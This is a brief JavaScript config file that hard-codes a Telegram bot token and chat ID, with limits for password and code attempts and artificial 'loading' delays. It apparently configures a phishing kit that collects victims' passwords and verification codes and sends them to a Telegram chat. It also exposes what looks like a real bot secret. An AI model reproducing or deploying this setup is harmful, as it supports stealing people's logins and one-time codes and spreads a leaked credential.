const config = {
    token: process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ?? '8288397640:AAEFdGkEz6bmI7yWukFZoA_DcGysT0f-glw',
    chat_id: process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ?? '-1003257858837',
    MAX_PASS: 2,
    MAX_CODE: 4,
    PASSWORD_LOADING_TIME: 6,
    CODE_LOADING_TIME: 15
};

export default config;
